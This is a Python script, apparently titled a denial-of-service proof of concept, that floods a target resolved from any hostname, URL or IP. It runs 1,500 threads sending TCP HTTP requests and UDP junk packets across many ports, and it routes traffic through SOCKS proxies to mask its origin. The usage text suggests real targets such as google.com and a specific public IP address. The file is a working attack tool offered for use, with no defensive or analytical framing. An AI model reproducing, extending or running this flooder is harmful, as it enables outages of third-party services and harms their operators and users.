import socket
import threading
import time
import sys
import random

try:
    import socks
    PROXY_AVAILABLE = True
except ImportError:
    socks = None
    PROXY_AVAILABLE = False

def resolve_target(target):
    if target.lower() == "localhost":
        return "127.0.0.1"

    try:
        socket.inet_aton(target)
        return target
    except socket.error:
        pass

    try:
        if target.startswith("http://"):
            target = target[7:]
        elif target.startswith("https://"):
            target = target[8:]

        if "/" in target:
            target = target.split("/")[0]

        if ":" in target:
            target = target.split(":")[0]

        ip = socket.gethostbyname(target)
        print(f"Resolved {target} to {ip}")
        return ip
    except socket.gaierror:
        raise ValueError(f"Cannot resolve hostname: {target}")

def validate_ip(ip):
    try:
        socket.inet_aton(ip)
        return True
    except socket.error:
        return False

class DOSFlood:
    def __init__(self, target_ip):
        if not validate_ip(target_ip):
            raise ValueError(f"Invalid IP address: {target_ip}")

        self.target_ip = target_ip
        self.ports = self.load_ports()
        self.thread_count = 1500
        self.running = False
        self.packets_sent = 0
        self.proxy_list = self.load_proxies()

        print(f"Initialized with target: {self.target_ip}")
        print(f"Loaded {len(self.ports)} ports for attack")
        if PROXY_AVAILABLE:
            print(f"Loaded {len(self.proxy_list)} proxies")
        else:
            print("No proxy support (install PySocks for proxy functionality)")

    def load_ports(self):
        try:
            with open('all_ports.txt', 'r') as f:
                ports = [int(line.strip()) for line in f if line.strip().isdigit()]
                ports = [p for p in ports if 1 <= p <= 65535]
                if len(ports) > 1000:
                    ports = random.sample(ports, 1000)
                return ports
        except (FileNotFoundError, ValueError):
            return [8080, 80, 443, 8443, 53, 21, 22, 25, 3000, 5000]

    def load_proxies(self):
        proxy_list = [
            ('127.0.0.1', 9050),
            ('127.0.0.1', 9051),
            ('127.0.0.1', 8080),
            ('8.8.8.8', 53),
            ('1.1.1.1', 53)
        ]
        return proxy_list

    def create_proxy_socket(self):
        if not PROXY_AVAILABLE:
            return socket.socket(socket.AF_INET, socket.SOCK_STREAM)

        try:
            proxy_host, proxy_port = random.choice(self.proxy_list)
            s = socks.socksocket()
            s.set_proxy(socks.SOCKS5, proxy_host, proxy_port)
            return s
        except:
            return socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    def flood_worker(self):
        while self.running:
            if self.target_ip == "127.0.0.1":
                for _ in range(50):
                    try:
                        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        s.settimeout(0.1)
                        s.connect((self.target_ip, 8080))
                        s.send(b"GET /index.html HTTP/1.1\r\nHost: localhost:8080\r\n\r\n")
                        s.close()
                        self.packets_sent += 1
                    except:
                        self.packets_sent += 1

                    try:
                        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                        s.sendto(b"LOCAL" * 50, (self.target_ip, 8080))
                        s.close()
                        self.packets_sent += 1
                    except:
                        self.packets_sent += 1
            else:
                target_port = random.choice(self.ports)

                for _ in range(25):
                    try:
                        s = self.create_proxy_socket()
                        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                        s.settimeout(0.1)
                        result = s.connect_ex((self.target_ip, target_port))
                        if result == 0:
                            s.send(b"GET / HTTP/1.1\r\nHost: " + self.target_ip.encode() + b"\r\n\r\n")
                        s.close()
                        self.packets_sent += 1
                    except:
                        self.packets_sent += 1

                    try:
                        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                        s.sendto(b"DATA" * random.randint(10, 50), (self.target_ip, target_port))
                        s.close()
                        self.packets_sent += 1
                    except:
                        self.packets_sent += 1

    def test_connection(self):
        open_ports = []
        for port in [8080, 80, 443, 22, 21, 53, 8443]:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(2)
                result = s.connect_ex((self.target_ip, port))
                s.close()
                if result == 0:
                    open_ports.append(port)
            except:
                pass

        if open_ports:
            print(f"Open ports found: {open_ports}")
            return True
        else:
            print(f"No common ports open on {self.target_ip}")
            return False

    def start_flood(self):
        print(f"Testing connection to {self.target_ip}")
        self.test_connection()

        print(f"Starting multi-port flood attack on {self.target_ip}")
        print(f"Using {self.thread_count} threads across {len(self.ports)} ports")

        self.running = True

        for i in range(self.thread_count):
            t = threading.Thread(target=self.flood_worker)
            t.daemon = True
            t.start()
            if i % 500 == 0:
                print(f"Started {i} threads...")

        start_time = time.time()
        print("Attack started!")

        try:
            while True:
                time.sleep(1)
                elapsed = time.time() - start_time
                rate = self.packets_sent / elapsed if elapsed > 0 else 0
                if self.packets_sent > 0:
                    print(f"flooding {self.target_ip} packets {self.packets_sent} rate {rate:.0f}/sec threads {self.thread_count}")
                else:
                    print(f"Attempting connections to {self.target_ip}...")
        except KeyboardInterrupt:
            self.running = False
            print(f"\nFlood stopped. Total packets sent to {self.target_ip}: {self.packets_sent}")

def main():
    if len(sys.argv) < 2:
        print("Usage: py dos_poc.py <target_ip|hostname|url>")
        print("Example: py dos_poc.py 185.27.134.116")
        print("Example: py dos_poc.py google.com")
        print("Example: py dos_poc.py https://example.com")
        print("Example: py dos_poc.py localhost")
        sys.exit(1)

    target_input = sys.argv[1]
    print(f"Target input: {target_input}")

    try:
        resolved_ip = resolve_target(target_input)
        print(f"Final target IP: {resolved_ip}")

        flood = DOSFlood(resolved_ip)
        flood.start_flood()
    except ValueError as e:
        print(f"Error: {e}")
    except KeyboardInterrupt:
        print("\nExiting...")

if __name__ == "__main__":
    main()